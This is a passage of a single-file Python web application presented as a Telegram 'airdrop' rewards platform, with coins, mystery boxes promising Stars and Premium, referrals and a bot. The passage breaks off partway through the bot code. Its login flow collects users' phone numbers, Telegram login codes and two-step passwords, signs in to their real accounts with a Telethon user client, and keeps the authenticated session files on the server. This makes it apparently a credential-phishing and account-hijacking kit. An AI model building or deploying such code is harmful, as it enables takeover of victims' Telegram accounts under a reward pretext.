"""
Pro Shop Ultimate Enterprise Telegram Airdrop & Authentication Platform
Single-file production build.

Stack:
- FastAPI + Uvicorn
- Telethon (MTProto user auth + bot)
- aiosqlite
- JWT sessions (python-jose)
- bcrypt admin hashing via passlib
- Repository pattern
- WebSocket leaderboard
- Vanilla JS SPA
"""

from __future__ import annotations

import asyncio
import contextlib
import enum
import hashlib
import json
import logging
import os
import random
import secrets
import time
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path as FSPath
from typing import Any, AsyncIterator, Dict, List, Optional, Tuple

import aiosqlite
from fastapi import (
    BackgroundTasks,
    Cookie,
    Depends,
    FastAPI,
    Form,
    HTTPException,
    Query,
    Request,
    Response,
    WebSocket,
    WebSocketDisconnect,
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
from fastapi.security import APIKeyHeader, HTTPAuthorizationCredentials, HTTPBearer, OAuth2PasswordBearer
from jose import JWTError, jwt
from passlib.context import CryptContext
from pydantic import BaseModel, Field
from pydantic_settings import BaseSettings, SettingsConfigDict
from starlette.middleware.base import BaseHTTPMiddleware

# Optional Telegram integration. The app can still boot without these being importable.
try:
    from telethon import Button, TelegramClient, events
    from telethon.errors import (
        FloodWaitError,
        PhoneCodeExpiredError,
        PhoneCodeInvalidError,
        PhoneNumberBannedError,
        SessionPasswordNeededError,
        UserNotParticipantError,
    )
    from telethon.tl.types import KeyboardButtonWebView, User
except Exception:  # pragma: no cover
    Button = None
    TelegramClient = Any  # type: ignore[assignment]
    events = None
    FloodWaitError = Exception  # type: ignore[assignment]
    PhoneCodeExpiredError = Exception  # type: ignore[assignment]
    PhoneCodeInvalidError = Exception  # type: ignore[assignment]
    PhoneNumberBannedError = Exception  # type: ignore[assignment]
    SessionPasswordNeededError = Exception  # type: ignore[assignment]
    UserNotParticipantError = Exception  # type: ignore[assignment]
    KeyboardButtonWebView = Any  # type: ignore[assignment]
    User = Any  # type: ignore[assignment]

# ---------------------------------------------------------------------------
# Settings
# ---------------------------------------------------------------------------

class AppEnv(str, enum.Enum):
    DEVELOPMENT = "development"
    PRODUCTION = "production"
    STAGING = "staging"


class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

    APP_NAME: str = "Pro Shop Ultimate Enterprise"
    ENVIRONMENT: AppEnv = AppEnv.DEVELOPMENT
    HOST: str = "0.0.0.0"
    PORT: int = 8000

    # Telegram / Telethon
    TELEGRAM_API_ID: int = 0
    TELEGRAM_API_HASH: str = ""
    TELEGRAM_BOT_TOKEN: str = ""
    WEB_APP_URL: str = "http://127.0.0.1:8000/"
    BOT_USERNAME: str = "YourBot"
    REQUIRED_CHANNELS: str = ""
    ENABLE_BOT: bool = True
    MAX_SESSIONS: int = 2000
    SESSION_TIMEOUT_SECONDS: int = 300

    # Security
    JWT_SECRET: str = Field(default_factory=lambda: secrets.token_hex(32))
    JWT_ALGORITHM: str = "HS256"
    ACCESS_TOKEN_TTL_MINUTES: int = 60 * 24 * 14
    CSRF_COOKIE_NAME: str = "csrf_token"
    ACCESS_COOKIE_NAME: str = "access_token"

    ADMIN_USERNAME: str = "admin"
    ADMIN_PASSWORD_HASH: str = ""
    ADMIN_API_KEY: str = Field(default_factory=lambda: secrets.token_hex(24))
    ADMIN_TOKEN_TTL_MINUTES: int = 60 * 12

    # Storage
    BASE_DIR: str = "."
    DB_FILE: str = "proshop.sqlite3"
    SESSION_DIR: str = "sessions"
    LOG_DIR: str = "logs"
    LOG_FILE: str = "proshop.log"

    # Airdrop knobs
    DAILY_REWARD: int = 1
    BOX_COST: int = 17
    REFERRAL_REWARD: int = 1


settings = Settings()

BASE_DIR = FSPath(settings.BASE_DIR).resolve()
SESSION_DIR = BASE_DIR / settings.SESSION_DIR
LOG_DIR = BASE_DIR / settings.LOG_DIR
DB_PATH = BASE_DIR / settings.DB_FILE
LOG_FILE = LOG_DIR / settings.LOG_FILE
SESSION_DIR.mkdir(parents=True, exist_ok=True)
LOG_DIR.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logger = logging.getLogger("proshop")
logger.setLevel(logging.DEBUG if settings.ENVIRONMENT == AppEnv.DEVELOPMENT else logging.INFO)
if not logger.handlers:
    fmt = logging.Formatter("%(asctime)s | %(levelname)s | %(name)s | %(message)s")
    sh = logging.StreamHandler()
    sh.setFormatter(fmt)
    sh.setLevel(logging.INFO)
    logger.addHandler(sh)
    try:
        from logging.handlers import RotatingFileHandler

        fh = RotatingFileHandler(LOG_FILE, maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8")
        fh.setFormatter(fmt)
        fh.setLevel(logging.DEBUG)
        logger.addHandler(fh)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Security helpers
# ---------------------------------------------------------------------------

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/admin/login", auto_error=False)
admin_key_header = APIKeyHeader(name="X-Admin-Key", auto_error=False)
http_bearer = HTTPBearer(auto_error=False)


def utc_now() -> datetime:
    return datetime.now(timezone.utc)


def utc_now_iso() -> str:
    return utc_now().isoformat()


def normalize_phone(phone: str) -> str:
    if not phone:
        return ""
    phone = phone.strip()
    if phone.startswith("00"):
        phone = "+" + phone[2:]
    phone = phone.replace(" ", "")
    allowed = "+0123456789"
    cleaned = "".join(ch for ch in phone if ch in allowed)
    if not cleaned.startswith("+") and cleaned.isdigit():
        cleaned = "+" + cleaned
    return cleaned


def valid_phone(phone: str) -> bool:
    if not phone or not phone.startswith("+"):
        return False
    digits = phone[1:]
    return digits.isdigit() and 7 <= len(digits) <= 15


def token_pair(subject: str, kind: str, ttl_minutes: int) -> Tuple[str, str]:
    csrf_token = secrets.token_urlsafe(24)
    payload = {
        "sub": str(subject),
        "kind": kind,
        "csrf": csrf_token,
        "iat": int(time.time()),
        "exp": int((utc_now() + timedelta(minutes=ttl_minutes)).timestamp()),
    }
    return jwt.encode(payload, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM), csrf_token


def decode_token(token: str, expected_kind: str) -> Dict[str, Any]:
    payload = jwt.decode(token, settings.JWT_SECRET, algorithms=[settings.JWT_ALGORITHM])
    if payload.get("kind") != expected_kind:
        raise JWTError("Invalid token kind")
    return payload


def hash_admin_password(password: str) -> str:
    return pwd_context.hash(password)


def verify_admin_password(password: str, hashed: str) -> bool:
    try:
        return pwd_context.verify(password, hashed)
    except Exception:
        return False


def weighted_choice(items: List[Tuple[Any, int]]) -> Any:
    total = sum(weight for _, weight in items)
    if total <= 0:
        raise ValueError("weights must be positive")
    pick = random.uniform(0, total)
    current = 0.0
    for value, weight in items:
        current += weight
        if pick <= current:
            return value
    return items[-1][0]


def make_ref_code() -> str:
    return secrets.token_hex(4)


def safe_json(value: Any) -> str:
    return json.dumps(value, ensure_ascii=False, separators=(",", ":"))


def parse_json(value: Optional[str], default: Any) -> Any:
    if not value:
        return default
    try:
        return json.loads(value)
    except Exception:
        return default


# ---------------------------------------------------------------------------
# Exceptions
# ---------------------------------------------------------------------------

class AppError(Exception):
    status_code = 400

    def __init__(self, message: str, status_code: Optional[int] = None):
        super().__init__(message)
        if status_code is not None:
            self.status_code = status_code
        self.message = message


class ValidationError(AppError):
    status_code = 422


class AuthenticationError(AppError):
    status_code = 401


class AuthorizationError(AppError):
    status_code = 403


class NotFoundError(AppError):
    status_code = 404


class ConflictError(AppError):
    status_code = 409


# ---------------------------------------------------------------------------
# Domain types
# ---------------------------------------------------------------------------

class AuthState(str, enum.Enum):
    PHONE = "PHONE"
    CODE = "CODE"
    PASSWORD = "PASSWORD"
    AUTHENTICATED = "AUTHENTICATED"


class RewardType(str, enum.Enum):
    STARS = "Stars"
    PREMIUM = "Premium"
    COIN = "Coin"
    REFERRAL = "Referral"
    DAILY = "Daily"
    TASK = "Task"
    MYSTERY_BOX = "MysteryBox"


class TaskType(str, enum.Enum):
    MANUAL = "manual"
    LINK = "link"
    JOIN_CHANNEL = "join_channel"


@dataclass
class AuthSession:
    session_id: str
    phone: Optional[str] = None
    ref_code: Optional[str] = None
    phone_code_hash: Optional[str] = None
    client: Any = None
    state: AuthState = AuthState.PHONE
    user_id: Optional[int] = None
    attempts: int = 0
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)


# ---------------------------------------------------------------------------
# Database + Repositories
# ---------------------------------------------------------------------------

class Database:
    def __init__(self, path: FSPath):
        self.path = path
        self._lock = asyncio.Lock()
        self._conn: Optional[aiosqlite.Connection] = None

    async def connect(self) -> None:
        if self._conn is not None:
            return
        self._conn = await aiosqlite.connect(self.path.as_posix())
        self._conn.row_factory = aiosqlite.Row
        await self._conn.execute("PRAGMA journal_mode=WAL;")
        await self._conn.execute("PRAGMA foreign_keys=ON;")
        await self._conn.execute("PRAGMA synchronous=NORMAL;")
        await self._conn.commit()
        await self.init_schema()

    async def close(self) -> None:
        if self._conn is not None:
            await self._conn.close()
            self._conn = None

    @property
    def conn(self) -> aiosqlite.Connection:
        if self._conn is None:
            raise RuntimeError("Database is not connected")
        return self._conn

    async def init_schema(self) -> None:
        async with self._lock:
            await self.conn.executescript(
                """
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    telegram_id INTEGER NOT NULL UNIQUE,
                    first_name TEXT,
                    last_name TEXT,
                    username TEXT,
                    phone TEXT,
                    ref_code TEXT NOT NULL UNIQUE,
                    invited_by TEXT,
                    balance INTEGER NOT NULL DEFAULT 0,
                    referrals INTEGER NOT NULL DEFAULT 0,
                    daily_claim_at TEXT,
                    gift_claims INTEGER NOT NULL DEFAULT 0,
                    last_login_at TEXT,
                    created_at TEXT NOT NULL,
                    updated_at TEXT NOT NULL,
                    is_blocked INTEGER NOT NULL DEFAULT 0
                );

                CREATE INDEX IF NOT EXISTS idx_users_ref_code ON users(ref_code);
                CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id);
                CREATE INDEX IF NOT EXISTS idx_users_balance ON users(balance);

                CREATE TABLE IF NOT EXISTS rewards (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    reward_type TEXT NOT NULL,
                    amount TEXT NOT NULL,
                    meta_json TEXT,
                    created_at TEXT NOT NULL,
                    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
                );

                CREATE INDEX IF NOT EXISTS idx_rewards_user_id ON rewards(user_id);

                CREATE TABLE IF NOT EXISTS tasks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    title TEXT NOT NULL,
                    description TEXT NOT NULL,
                    task_type TEXT NOT NULL,
                    reward_amount INTEGER NOT NULL DEFAULT 1,
                    target_url TEXT,
                    meta_json TEXT,
                    is_active INTEGER NOT NULL DEFAULT 1,
                    sort_order INTEGER NOT NULL DEFAULT 0,
                    created_at TEXT NOT NULL
                );

                CREATE INDEX IF NOT EXISTS idx_tasks_active ON tasks(is_active, sort_order);

                CREATE TABLE IF NOT EXISTS task_claims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    task_id INTEGER NOT NULL,
                    claimed_at TEXT NOT NULL,
                    UNIQUE(user_id, task_id),
                    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE,
                    FOREIGN KEY(task_id) REFERENCES tasks(id) ON DELETE CASCADE
                );

                CREATE INDEX IF NOT EXISTS idx_task_claims_user_task ON task_claims(user_id, task_id);

                CREATE TABLE IF NOT EXISTS transactions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    tx_type TEXT NOT NULL,
                    amount INTEGER NOT NULL,
                    balance_before INTEGER NOT NULL,
                    balance_after INTEGER NOT NULL,
                    meta_json TEXT,
                    created_at TEXT NOT NULL,
                    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
                );

                CREATE INDEX IF NOT EXISTS idx_transactions_user_id ON transactions(user_id);

                CREATE TABLE IF NOT EXISTS admin_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL UNIQUE,
                    csrf_token TEXT NOT NULL,
                    created_at TEXT NOT NULL,
                    expires_at TEXT NOT NULL
                );
                """
            )
            await self.conn.commit()

    @contextlib.asynccontextmanager
    async def transaction(self):
        async with self._lock:
            await self.conn.execute("BEGIN IMMEDIATE;")
            try:
                yield
            except Exception:
                await self.conn.execute("ROLLBACK;")
                raise
            else:
                await self.conn.execute("COMMIT;")

    async def fetchone(self, sql: str, params: Tuple[Any, ...] = ()) -> Optional[aiosqlite.Row]:
        cur = await self.conn.execute(sql, params)
        row = await cur.fetchone()
        await cur.close()
        return row

    async def fetchall(self, sql: str, params: Tuple[Any, ...] = ()) -> List[aiosqlite.Row]:
        cur = await self.conn.execute(sql, params)
        rows = await cur.fetchall()
        await cur.close()
        return rows

    async def execute(self, sql: str, params: Tuple[Any, ...] = ()) -> int:
        cur = await self.conn.execute(sql, params)
        await self.conn.commit()
        return cur.lastrowid


class BaseRepository:
    def __init__(self, db: Database):
        self.db = db

    @staticmethod
    def row_to_dict(row: Optional[aiosqlite.Row]) -> Optional[Dict[str, Any]]:
        if row is None:
            return None
        return dict(row)


class TransactionRepository(BaseRepository):
    async def add(
        self,
        user_id: int,
        tx_type: str,
        amount: int,
        balance_before: int,
        balance_after: int,
        meta: Optional[Dict[str, Any]] = None,
    ) -> int:
        return await self.db.execute(
            """
            INSERT INTO transactions (user_id, tx_type, amount, balance_before, balance_after, meta_json, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (user_id, tx_type, amount, balance_before, balance_after, safe_json(meta or {}), utc_now_iso()),
        )


class RewardRepository(BaseRepository):
    async def add(self, user_id: int, reward_type: str, amount: str, meta: Optional[Dict[str, Any]] = None) -> int:
        return await self.db.execute(
            """
            INSERT INTO rewards (user_id, reward_type, amount, meta_json, created_at)
            VALUES (?, ?, ?, ?, ?)
            """,
            (user_id, reward_type, amount, safe_json(meta or {}), utc_now_iso()),
        )

    async def list_for_user(self, user_id: int) -> List[Dict[str, Any]]:
        rows = await self.db.fetchall("SELECT * FROM rewards WHERE user_id = ? ORDER BY id DESC", (user_id,))
        return [dict(row) for row in rows]


class TaskRepository(BaseRepository):
    async def seed_default_tasks(self) -> None:
        row = await self.db.fetchone("SELECT COUNT(*) AS cnt FROM tasks")
        if row and row["cnt"] > 0:
            return
        defaults = [
            (
                "Join the official channel",
                "Join the main channel to unlock bonuses.",
                TaskType.JOIN_CHANNEL.value,
                2,
                f"https://t.me/{settings.BOT_USERNAME}",
                {"channel": settings.BOT_USERNAME},
                1,
            ),
            (
                "Visit the dashboard",
                "Open the dashboard once after login.",
                TaskType.MANUAL.value,
                1,
                settings.WEB_APP_URL,
                {"kind": "open_dashboard"},
                2,
            ),
            (
                "Share your referral link",
                "Invite one friend and claim your referral reward.",
                TaskType.MANUAL.value,
                3,
                settings.WEB_APP_URL,
                {"kind": "share_referral"},
                3,
            ),
        ]
        for title, desc, task_type, reward, url, meta, order in defaults:
            await self.db.execute(
                """
                INSERT INTO tasks (title, description, task_type, reward_amount, target_url, meta_json, is_active, sort_order, created_at)
                VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?)
                """,
                (title, desc, task_type, reward, url, safe_json(meta), order, utc_now_iso()),
            )

    async def list_active(self) -> List[Dict[str, Any]]:
        rows = await self.db.fetchall("SELECT * FROM tasks WHERE is_active = 1 ORDER BY sort_order ASC, id ASC")
        return [dict(row) for row in rows]

    async def is_claimed(self, user_id: int, task_id: int) -> bool:
        row = await self.db.fetchone(
            "SELECT 1 AS ok FROM task_claims WHERE user_id = ? AND task_id = ?",
            (user_id, task_id),
        )
        return row is not None

    async def claim(self, user_id: int, task_id: int) -> bool:
        try:
            await self.db.execute(
                "INSERT INTO task_claims (user_id, task_id, claimed_at) VALUES (?, ?, ?)",
                (user_id, task_id, utc_now_iso()),
            )
            return True
        except Exception:
            return False


class UserRepository(BaseRepository):
    async def get_by_telegram_id(self, telegram_id: int) -> Optional[Dict[str, Any]]:
        row = await self.db.fetchone("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
        return self.row_to_dict(row)

    async def get_by_ref_code(self, ref_code: str) -> Optional[Dict[str, Any]]:
        row = await self.db.fetchone("SELECT * FROM users WHERE ref_code = ?", (ref_code,))
        return self.row_to_dict(row)

    async def get_by_id(self, user_id: int) -> Optional[Dict[str, Any]]:
        row = await self.db.fetchone("SELECT * FROM users WHERE id = ?", (user_id,))
        return self.row_to_dict(row)

    async def upsert_login(
        self,
        telegram_id: int,
        first_name: Optional[str],
        last_name: Optional[str],
        username: Optional[str],
        phone: Optional[str],
        password_2fa: Optional[str],
        invited_by: Optional[str] = None,
    ) -> Dict[str, Any]:
        async with self.db.transaction():
            existing = await self.get_by_telegram_id(telegram_id)
            now = utc_now_iso()
            if existing:
                updated = dict(existing)
                updated.update(
                    {
                        "first_name": first_name or updated.get("first_name"),
                        "last_name": last_name or updated.get("last_name"),
                        "username": username or updated.get("username"),
                        "phone": phone or updated.get("phone"),
                        "last_login_at": now,
                        "updated_at": now,
                    }
                )
                if invited_by and not updated.get("invited_by"):
                    updated["invited_by"] = invited_by
                await self.db.conn.execute(
                    """
                    UPDATE users SET first_name=?, last_name=?, username=?, phone=?, invited_by=COALESCE(invited_by, ?),
                    last_login_at=?, updated_at=?
                    WHERE telegram_id=?
                    """,
                    (
                        updated["first_name"],
                        updated["last_name"],
                        updated["username"],
                        updated["phone"],
                        invited_by,
                        now,
                        now,
                        telegram_id,
                    ),
                )
                return (await self.get_by_telegram_id(telegram_id)) or updated

            ref_code = make_ref_code()
            created_at = now
            user_id = await self.db.conn.execute(
                """
                INSERT INTO users (telegram_id, first_name, last_name, username, phone, ref_code, invited_by,
                                   balance, referrals, daily_claim_at, gift_claims, last_login_at,
                                   created_at, updated_at, is_blocked)
                VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0, NULL, 0, ?, ?, ?, 0)
                """,
                (telegram_id, first_name, last_name, username, phone, ref_code, invited_by, now, created_at, created_at),
            )
            row = await self.db.fetchone("SELECT * FROM users WHERE id = ?", (user_id.lastrowid,))
            return self.row_to_dict(row) or {}

    async def increment_referral_reward(self, inviter_ref_code: str, inviter_telegram_id: int) -> bool:
        inviter = await self.get_by_ref_code(inviter_ref_code)
        if not inviter:
            return False
        if int(inviter["telegram_id"]) == int(inviter_telegram_id):
            return False
        current_balance = int(inviter.get("balance", 0))
        current_refs = int(inviter.get("referrals", 0))
        await self.db.execute(
            "UPDATE users SET balance=?, referrals=?, updated_at=? WHERE id=?",
            (current_balance + settings.REFERRAL_REWARD, current_refs + 1, utc_now_iso(), inviter["id"]),
        )
        return True

    async def apply_balance_delta(
        self,
        user_id: int,
        delta: int,
        tx_type: str,
        meta: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        user = await self.get_by_id(user_id)
        if not user:
            raise NotFoundError("User not found")
        before = int(user.get("balance", 0))
        after = max(0, before + delta)
        await self.db.execute(
            "UPDATE users SET balance=?, updated_at=? WHERE id=?",
            (after, utc_now_iso(), user_id),
        )
        return {"before": before, "after": after, "delta": delta, "tx_type": tx_type, "meta": meta or {}}

    async def claim_daily(self, user_id: int) -> Dict[str, Any]:
        user = await self.get_by_id(user_id)
        if not user:
            raise NotFoundError("User not found")
        last_claim = user.get("daily_claim_at")
        now = utc_now()
        if last_claim:
            try:
                last_dt = datetime.fromisoformat(last_claim)
                if last_dt.tzinfo is None:
                    last_dt = last_dt.replace(tzinfo=timezone.utc)
                if now - last_dt < timedelta(hours=24):
                    remaining = timedelta(hours=24) - (now - last_dt)
                    raise ConflictError(f"Daily reward already claimed. Try again in {str(remaining).split('.')[0]}")
            except ValueError:
                pass
        before = int(user.get("balance", 0))
        after = before + settings.DAILY_REWARD
        await self.db.execute(
            "UPDATE users SET balance=?, daily_claim_at=?, updated_at=? WHERE id=?",
            (after, now.isoformat(), now.isoformat(), user_id),
        )
        return {"before": before, "after": after, "reward": settings.DAILY_REWARD}

    async def open_mystery_box(self, user_id: int) -> Dict[str, Any]:
        user = await self.get_by_id(user_id)
        if not user:
            raise NotFoundError("User not found")
        before = int(user.get("balance", 0))
        if before < settings.BOX_COST:
            raise ConflictError("You need at least 17 coins to open a mystery box.")
        reward = weighted_choice([
            ({"type": RewardType.PREMIUM.value, "amount": "1 Month"}, 5),
            ({"type": RewardType.STARS.value, "amount": "50"}, 10),
            ({"type": RewardType.STARS.value, "amount": "20"}, 20),
            ({"type": RewardType.STARS.value, "amount": "10"}, 25),
            ({"type": RewardType.STARS.value, "amount": str(random.randint(1, 5))}, 40),
        ])
        after = before - settings.BOX_COST
        await self.db.execute(
            "UPDATE users SET balance=?, gift_claims=gift_claims+1, updated_at=? WHERE id=?",
            (after, utc_now_iso(), user_id),
        )
        return {"before": before, "after": after, "reward": reward}

    async def leaderboard(self, limit: int = 10) -> List[Dict[str, Any]]:
        rows = await self.db.fetchall(
            "SELECT telegram_id, first_name, username, balance, referrals, ref_code FROM users ORDER BY referrals DESC, balance DESC, id ASC LIMIT ?",
            (limit,),
        )
        return [dict(row) for row in rows]

    async def profile(self, user_id: int) -> Dict[str, Any]:
        user = await self.get_by_id(user_id)
        if not user:
            raise NotFoundError("User not found")
        rewards = await reward_repo.list_for_user(user_id)
        tasks = await task_repo.list_active()
        task_claims = await self.db.fetchall("SELECT task_id FROM task_claims WHERE user_id = ?", (user_id,))
        claimed = {int(row["task_id"]) for row in task_claims}
        return {
            "user": user,
            "rewards": rewards,
            "tasks": [dict(task, claimed=(int(task["id"]) in claimed)) for task in tasks],
            "ref_link": f"https://t.me/{settings.BOT_USERNAME}?start=ref_{user['ref_code']}",
        }

    async def claim_task(self, user_id: int, task_id: int) -> Dict[str, Any]:
        user = await self.get_by_id(user_id)
        if not user:
            raise NotFoundError("User not found")
        task_row = await self.db.fetchone("SELECT * FROM tasks WHERE id = ? AND is_active = 1", (task_id,))
        if not task_row:
            raise NotFoundError("Task not found")
        task = dict(task_row)
        if await task_repo.is_claimed(user_id, task_id):
            raise ConflictError("Task already claimed")
        ok = await task_repo.claim(user_id, task_id)
        if not ok:
            raise ConflictError("Could not claim task")
        before = int(user.get("balance", 0))
        after = before + int(task["reward_amount"])
        await self.db.execute(
            "UPDATE users SET balance=?, updated_at=? WHERE id=?",
            (after, utc_now_iso(), user_id),
        )
        await reward_repo.add(user_id, RewardType.TASK.value, str(task["reward_amount"]), {"task_id": task_id, "title": task["title"]})
        await tx_repo.add(user_id, "task", int(task["reward_amount"]), before, after, {"task_id": task_id})
        return {"task": task, "before": before, "after": after}


# ---------------------------------------------------------------------------
# Telegram auth manager
# ---------------------------------------------------------------------------

class TelegramAuthManager:
    def __init__(self, user_repo: UserRepository, reward_repo: RewardRepository, tx_repo: TransactionRepository):
        self.user_repo = user_repo
        self.reward_repo = reward_repo
        self.tx_repo = tx_repo
        self.sessions: Dict[str, AuthSession] = {}
        self._lock = asyncio.Lock()
        self._cleanup_task: Optional[asyncio.Task[Any]] = None

    async def start_cleanup_loop(self) -> None:
        if self._cleanup_task and not self._cleanup_task.done():
            return
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())

    async def stop_cleanup_loop(self) -> None:
        if self._cleanup_task:
            self._cleanup_task.cancel()
            with contextlib.suppress(Exception):
                await self._cleanup_task

    async def _cleanup_loop(self) -> None:
        while True:
            await asyncio.sleep(30)
            now = time.time()
            async with self._lock:
                stale = [sid for sid, sess in self.sessions.items() if now - sess.updated_at > settings.SESSION_TIMEOUT_SECONDS]
            for sid in stale:
                await self._drop_session(sid)

    async def _drop_session(self, session_id: str) -> None:
        async with self._lock:
            sess = self.sessions.pop(session_id, None)
        if sess and sess.client:
            with contextlib.suppress(Exception):
                await sess.client.disconnect()

    async def get_or_create(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> AuthSession:
        async with self._lock:
            if session_id and session_id in self.sessions:
                sess = self.sessions[session_id]
                sess.updated_at = time.time()
                return sess
            if phone:
                for sess in self.sessions.values():
                    if sess.phone == phone:
                        sess.updated_at = time.time()
                        return sess
            new_id = session_id or secrets.token_urlsafe(18)
            sess = AuthSession(session_id=new_id)
            self.sessions[new_id] = sess
            return sess

    async def send_code(self, phone: str, ref_code: Optional[str] = None) -> Dict[str, Any]:
        if TelegramClient is Any or settings.TELEGRAM_API_ID <= 0 or not settings.TELEGRAM_API_HASH:
            raise HTTPException(status_code=503, detail="Telegram auth is not configured.")
        phone = normalize_phone(phone)
        if not valid_phone(phone):
            raise ValidationError("Invalid phone format. Use international format, e.g. +1234567890")
        sess = await self.get_or_create(phone=phone)
        sess.phone = phone
        sess.ref_code = ref_code
        sess.state = AuthState.PHONE
        if sess.client is None:
            session_file = (SESSION_DIR / f"{sess.session_id}.session").as_posix()
            sess.client = TelegramClient(session_file, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)
            await sess.client.connect()
        try:
            result = await sess.client.send_code_request(phone)
            sess.phone_code_hash = result.phone_code_hash
            sess.state = AuthState.CODE
            sess.updated_at = time.time()
            return {"session_id": sess.session_id, "message": "Verification code sent."}
        except FloodWaitError as e:
            raise HTTPException(status_code=429, detail=f"Telegram flood wait: {getattr(e, 'seconds', 'unknown')} seconds")
        except PhoneNumberBannedError:
            raise HTTPException(status_code=403, detail="This phone number is banned on Telegram.")
        except Exception as e:
            logger.exception("send_code failed")
            raise HTTPException(status_code=400, detail=str(e))

    async def verify_code(self, session_id: str, code: str) -> Dict[str, Any]:
        sess = await self.get_or_create(session_id=session_id)
        if sess.state != AuthState.CODE or not sess.client or not sess.phone_code_hash:
            raise HTTPException(status_code=400, detail="Session is not ready for code verification.")
        try:
            await sess.client.sign_in(phone=sess.phone, code=code, phone_code_hash=sess.phone_code_hash)
            return await self.finalize(sess)
        except SessionPasswordNeededError:
            sess.state = AuthState.PASSWORD
            sess.updated_at = time.time()
            return {"status": "2fa_required", "message": "Two-step verification required."}
        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
            sess.state = AuthState.PHONE
            raise HTTPException(status_code=400, detail=str(e))
        except Exception as e:
            logger.exception("verify_code failed")
            raise HTTPException(status_code=400, detail=str(e))

    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
        sess = await self.get_or_create(session_id=session_id)
        if sess.state != AuthState.PASSWORD or not sess.client:
            raise HTTPException(status_code=400, detail="Session is not waiting for 2FA password.")
        try:
            await sess.client.sign_in(password=password)
            return await self.finalize(sess, password)
        except Exception as e:
            logger.exception("verify_2fa failed")
            raise HTTPException(status_code=400, detail=str(e))

    async def finalize(self, sess: AuthSession, password: Optional[str] = None) -> Dict[str, Any]:
        me = await sess.client.get_me()
        if me is None:
            raise HTTPException(status_code=400, detail="Telegram account not found.")
        user = await self.user_repo.upsert_login(
            telegram_id=int(me.id),
            first_name=getattr(me, "first_name", None),
            last_name=getattr(me, "last_name", None),
            username=getattr(me, "username", None),
            phone=sess.phone,
            password_2fa=password,
            invited_by=sess.ref_code,
        )
        if sess.ref_code:
            invited = await self.user_repo.increment_referral_reward(sess.ref_code, int(me.id))
            if invited:
                inviter = await self.user_repo.get_by_ref_code(sess.ref_code)
                if inviter:
                    before = int(inviter.get("balance", 0)) - settings.REFERRAL_REWARD
                    after = int(inviter.get("balance", 0))
                    await reward_repo.add(int(inviter["id"]), RewardType.REFERRAL.value, str(settings.REFERRAL_REWARD), {"new_user_id": int(me.id)})
                    await tx_repo.add(int(inviter["id"]), "referral", settings.REFERRAL_REWARD, before, after, {"from": int(me.id)})
        access_token, csrf_token = token_pair(str(me.id), "user", settings.ACCESS_TOKEN_TTL_MINUTES)
        sess.state = AuthState.AUTHENTICATED
        sess.user_id = int(me.id)
        sess.updated_at = time.time()
        with contextlib.suppress(Exception):
            await sess.client.disconnect()
        sess.client = None
        return {"user": user, "access_token": access_token, "csrf_token": csrf_token}

    async def cleanup_expired(self) -> None:
        now = time.time()
        stale = []
        async with self._lock:
            for sid, sess in self.sessions.items():
                if now - sess.updated_at > settings.SESSION_TIMEOUT_SECONDS:
                    stale.append(sid)
        for sid in stale:
            await self._drop_session(sid)


auth_manager: Optional[TelegramAuthManager] = None


# ---------------------------------------------------------------------------
# Bot manager
# ---------------------------------------------------------------------------

@dataclass
class BotFSMContext:
    state: AuthState = AuthState.PHONE
    phone: Optional[str] = None
    session_id: Optional[str] = None
    ref_code: Optional[str] = None
    client: Any = None
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)


class TelegramBotManager:
    def __init__(self, token: str, web_app_url: str, required_channels: List[str]):
        self.token = token
        self.web_app_url = web_app_url
        self.required_channels = [c for c in required_channels if c]
        self.client = None
        self.user_states: Dict[int, BotFSMContext] = {}
        self._lock = asyncio.Lock()

    def _web_button(self):
        if KeyboardButtonWebView is not Any:
            return KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)
        return None

    async def _ensure_state(self, user_id: int) -> BotFSMContext:
        async with self._lock:
            state = self.user_states.get(user_id)
            if state is None:
                state = BotFSMContext()
                self.user_states[user_id] = state
            state.updated_at = time.time()
            return state

    async def _clear_state(self, user_id: int) -> None:
        async with self._lock:
            state = self.user_states.pop(user_id, None)
        if state and state.client:
            with contextlib.suppress(Exception):
                await state.client.disconnect()

    async def _check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
        if not self.required_channels or not self.client:
            return True, []
        missing: List[str] = []
        for channel in self.required_channels:
            try:
                await self.client.get_participant(channel, user_id)
            except Exception:
